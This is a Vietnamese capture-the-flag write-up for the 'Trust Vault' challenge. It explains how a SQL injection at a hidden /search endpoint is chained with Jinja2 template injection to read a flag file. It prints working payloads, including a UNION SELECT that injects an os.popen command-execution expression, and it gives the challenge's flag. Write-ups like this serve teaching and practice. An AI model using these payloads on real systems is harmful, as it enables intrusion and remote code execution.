# 🚩 Write-up: Trust Vault (ThoughtVault)

## 1\. Tổng quan (Overview)

  * **Mục tiêu:** Lấy được Flag lưu trên server.
  * **Gợi ý:** Kết hợp lỗ hổng **SQL Injection** (SQLi) với **Legacy Jinja rendering** (Server-Side Template Injection - SSTI).
  * **Các điểm cuối (Endpoints) quan trọng:**
      * `/login`: Có lỗ hổng SQLi (nhưng khó khai thác trực tiếp để lấy flag).
      * `/audit`: Trang lộ thông tin (Information Leakage), hiển thị lịch sử các câu query của người khác.
      * `/search` (Legacy console): Endpoint ẩn chứa lỗ hổng chính.

## 2\. Quá trình trinh sát (Reconnaissance)

### A. Phát hiện điểm yếu tại Login

Ban đầu, ta thử SQL Injection tại trang Login. Việc thử các payload như `' UNION SELECT 1,2,3 --` trả về lỗi `Invalid credentials` thay vì lỗi 500, cho thấy đây là dạng **Blind SQLi**. Tuy nhiên, việc khai thác ở đây khá tốn thời gian.

### B. Tìm ra "Kho báu" tại trang Audit

Khi truy cập vào `/audit` (Audit Log), ta thấy lịch sử các payload mà những người chơi khác (như user `bing`, `test`) đã thực hiện. Đây là manh mối quan trọng nhất vì nó tiết lộ:

1.  **Endpoint ẩn:** Các payload tấn công vào `/search` thay vì `/login`.
2.  **Tên file Flag:** `/flag-feb215f4b1448e3b51f37fe4cf498e18.txt` (Thay vì `/flag.txt` thông thường).
3.  **Cấu trúc Payload:** Họ sử dụng `UNION SELECT` kết hợp với code Python (Jinja2).

### C. Tìm Endpoint ẩn `/search`

Kiểm tra Source Code HTML (hoặc dựa vào log), ta thấy dòng comment bị ẩn:
\`\`
👉 Đây chính là nơi chúng ta sẽ tấn công.

## 3\. Phân tích lỗ hổng (Vulnerability Analysis)

Bài này là một chuỗi tấn công (Chain attack) gồm 2 bước:

1.  **SQL Injection (SQLi):**
    Tại `/search`, server thực hiện câu lệnh SQL dạng:

    ```sql
    SELECT content FROM messages WHERE topic = '$USER_INPUT'
    ```

    Chúng ta có thể dùng `UNION SELECT` để chèn thêm một dòng dữ liệu giả vào kết quả trả về.

2.  **SSTI (Server-Side Template Injection):**
    Dữ liệu trả về từ Database (cột `content`) sau đó được render trực tiếp bởi **Jinja2** (template engine của Python) mà không qua lọc (sanitize).
    $\rightarrow$ Nếu ta chèn code Jinja2 vào Database qua SQLi, server sẽ thực thi code đó khi hiển thị kết quả.

## 4\. Quá trình khai thác (Exploitation)

### Bước 1: Xác định số cột

Quan sát lỗi `SELECTs to the left and right of UNION do not have the same number of result columns` khi dùng payload 3 cột (của trang Login), ta suy ra trang `/search` chỉ lấy **1 cột** duy nhất.

### Bước 2: Xây dựng Payload RCE

Chúng ta cần một payload Jinja2 để đọc file hệ thống (RCE). Payload tiêu chuẩn để đọc file trong Jinja2:

```python
{{ cycler.__init__.__globals__.__builtins__.__import__("os").popen("cat /path/to/flag").read() }}
```

### Bước 3: Ghép Payload hoàn chỉnh

Kết hợp SQLi (1 cột) và SSTI, ta có payload cuối cùng:

```sql
' UNION SELECT '{{ cycler.__init__.__globals__.__builtins__.__import__("os").popen("cat /flag-feb215f4b1448e3b51f37fe4cf498e18.txt").read() }}' --
```

**Giải thích:**

  * `'`: Đóng chuỗi input cũ.
  * `UNION SELECT`: Nối thêm kết quả giả.
  * `'{{ ... }}'`: Nội dung giả chứa mã độc SSTI.
  * `--`: Comment bỏ phần đuôi câu lệnh SQL gốc.

## 5\. Kết quả

Khi nhập payload vào ô tìm kiếm tại `/search`, server thực thi lệnh `cat` và trả về nội dung file Flag ngay trên màn hình kết quả.

**Flag:** `PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}`

-----

*Bài học rút ra: Luôn kiểm tra Source Code HTML (tìm comment ẩn) và các trang Log/History nếu có, vì "copy bài" đôi khi là cách nhanh nhất để giải CTF\! 😄*